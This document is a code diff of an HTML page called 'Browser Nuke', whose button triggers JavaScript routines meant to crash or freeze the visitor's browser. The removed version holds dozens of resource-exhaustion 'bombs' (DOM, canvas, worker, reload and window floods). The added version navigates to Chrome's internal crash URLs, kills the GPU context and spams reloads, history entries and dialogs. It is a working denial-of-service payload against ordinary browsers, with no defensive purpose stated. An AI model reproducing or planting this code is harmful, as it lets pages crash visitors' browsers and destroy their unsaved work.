@@ -56,61 +56,90 @@
 <body>
   <div class="card">
     <div class="title">Browser Nuke</div>
-    <div class="subtitle">One click to engage all crash routines</div>
-    <div class="warning">This will crash and close your entire browser instantly. Multiple vectors will trigger across processes.</div>
+    <div class="subtitle">One click to engage crash routines</div>
+    <div class="warning">Targets the browser process directly—avoids memory exhaustion.</div>
     <button class="button" id="nukeBtn">Crash Browser</button>
     <div class="details">
-      <p>Included crash vectors:</p>
+      <p>Key vectors (full list under the hood):</p>
       <ul>
-        <li>GPU context termination</li>
-        <li>Memory flooding & OOM</li>
-        <li>Infinite loops (JS, eval, promises)</li>
-        <li>DOM & resource injection</li>
-        <li>Dialog & navigation spam</li>
+        <li>Native crash URL navigation</li>
+        <li>GPU process kill</li>
+        <li>Main‐thread infinite loops</li>
+        <li>Forced reload and history spam</li>
+        <li>Dialog spam & DOM injection</li>
       </ul>
     </div>
   </div>
 
   <script>
     const crash = {
-      stackOverflow: () => { (function r(){ r(); })(); },
-      domBomb:       () => { while(true) document.body.appendChild(document.createElement('div')); },
-      canvasBomb:    () => { const c=document.createElement('canvas'); c.width=c.height=1e4; document.body.appendChild(c); const ctx=c.getContext('2d'); while(true) ctx.fillRect(0,0,1e4,1e4); },
-      webglLose:     () => { const c=document.createElement('canvas'); document.body.appendChild(c); const gl=c.getContext('webgl2')||c.getContext('webgl'); const ext=gl.getExtension('WEBGL_lose_context'); if(ext) ext.loseContext(); },
-      fatalAlloc:    () => { try{ new ArrayBuffer(1e12); }catch{} },
-      infiniteEval:  () => { while(true) eval('Math.random()'); },
-      writeBomb:     () => { while(true) document.write('<div></div>'); },
-      promiseBomb:   () => { (function p(){ Promise.resolve().then(p); })(); },
-      reloadLoop:    () => { while(true) location.reload(true); },
-      historyBomb:   () => { for(let i=0;i<5000;i++) history.pushState(null,'',location.href); },
-      fetchBomb:     () => { while(true) fetch(location.href,{mode:'no-cors'}).catch(()=>{}); },
-      xhrBomb:       () => { while(true){ try{ new XMLHttpRequest().open('GET','/404',false).send(); }catch{} } },
-      workerBomb:    () => { const b=new Blob(['onmessage=()=>{while(true)Array(1e6).fill(0);}'],{type:'application/javascript'}); const u=URL.createObjectURL(b); while(true){ const w=new Worker(u); w.postMessage('go'); } },
-      cookieBomb:    () => { while(true) document.cookie='c='+new Array(1e3).join('*'); },
-      sharedBomb:    () => { const sb=new SharedArrayBuffer(4); const ia=new Int32Array(sb); while(true) Atomics.wait(ia,0,0,1000); },
-      swBomb:        () => { if(navigator.serviceWorker) for(let i=0;i<50;i++) navigator.serviceWorker.register('data:text/javascript,while(1){}'); },
-      dbBomb:        () => { let i=0; while(true) indexedDB.open('db'+(i++)).onupgradeneeded=()=>{}; },
-      offscreenBomb: () => { if('OffscreenCanvas' in window){ const oc=new OffscreenCanvas(1e4,1e4); const g=oc.getContext('2d'); while(true) g.fillRect(0,0,1e4,1e4); } },
-      cssBomb:       () => { const s=document.createElement('style'); document.head.appendChild(s); while(true) s.textContent+='*{animation:none!important;}'; },
-      printDialogBomb:() => { while(true) window.print(); },
-      customElementsBomb:() => { let i=0; while(true) customElements.define('x-'+(i++), class extends HTMLElement{}); },
-      mutationObserverBomb:() => { const obs=new MutationObserver(()=>{}); obs.observe(document,{childList:true,subtree:true}); while(true) document.body.appendChild(document.createElement('div')); },
-      intervalBomb:  () => { setInterval(()=>{ for(let i=0;i<1e5;i++) Math.random(); },0); },
-      timerBomb:     () => { setTimeout(function loop(){ Math.random(); setTimeout(loop,0); },0); },
-      blobUriBomb:   () => { const p='data:text/html;base64,'+btoa('<script>location=location<\/script>'); while(true) window.open(p); },
-      websocketBomb: () => { while(true){ try{ new WebSocket('wss://localhost'); }catch{} } },
-      mediaSourceBomb:() => { if(window.MediaSource){ while(true){ const ms=new MediaSource(); } } },
-      audioBomb:     () => { (function a(){ new AudioContext(); a(); })(); },
-      errorBomb:     () => { while(true) { throw new Error('Crash'); } },
-      microtaskBomb: () => { (function m(){ queueMicrotask(m); })(); },
-      performanceBomb:() => { while(true) performance.now(); },
-      idleCallbackBomb:() => { if(window.requestIdleCallback) (function i(){ requestIdleCallback(i); })(); },
-      cryptoBomb:    () => { while(true) crypto.getRandomValues(new Uint32Array(1)); },
-      encryptionBomb:() => { if(window.crypto && crypto.subtle) while(true) crypto.subtle.digest('SHA-256', new Uint8Array(1024)); },
-      anchorBomb:    () => { for(let i=0;i<10000;i++){ const a=document.createElement('a'); a.href='#'; document.body.appendChild(a);} },
-      nuke:          () => { Object.keys(crash).filter(k=>'nuke'!==k).forEach(k=>setTimeout(crash[k],0)); }
+      // Navigate to internal Chrome crash URL (browser process)
+      browserKill: () => {
+        // Immediate attempt to crash browser
+        window.location.href = 'chrome://inducebrowsercrashforrealz';
+        // Fallback to tab crash URL shortly after
+        setTimeout(() => {
+          window.location.href = 'chrome://crash';
+        }, 100);
+      },
+
+      // Kill GPU process
+      gpuKill: () => {
+        const c = document.createElement('canvas');
+        document.body.appendChild(c);
+        const gl = c.getContext('webgl2') || c.getContext('webgl');
+        const ext = gl.getExtension('WEBGL_lose_context');
+        if (ext) ext.loseContext();
+      },
+
+      // Freeze main thread
+      infiniteEval: () => {
+        while (true) eval('0');
+      },
+
+      promiseBomb: () => {
+        (function loop() {
+          Promise.resolve().then(loop);
+        })();
+      },
+
+      // Force browser reload (cache‑bypass)
+      reloadLoop: () => {
+        while (true) location.reload(true);
+      },
+
+      // Spam history entries
+      historyBomb: () => {
+        for (let i = 0; i < 5000; i++) {
+          history.pushState(null, '', location.href);
+        }
+      },
+
+      // Dialog flood
+      dialogSpam: () => {
+        while (true) confirm('Crash?');
+      },
+
+      // DOM injection to keep UI busy
+      domBomb: () => {
+        while (true) document.body.appendChild(document.createElement('div'));
+      },
+
+      nuke: function() {
+        // Execute all high‐impact, non‑memory routines
+        this.browserKill();
+        this.gpuKill();
+        this.infiniteEval();
+        this.promiseBomb();
+        this.reloadLoop();
+        this.historyBomb();
+        this.dialogSpam();
+        this.domBomb();
+      }
     };
-    document.getElementById('nukeBtn').addEventListener('click',()=>crash.nuke());
+
+    document.getElementById('nukeBtn')
+            .addEventListener('click', () => crash.nuke());
   </script>
 </body>
 </html>
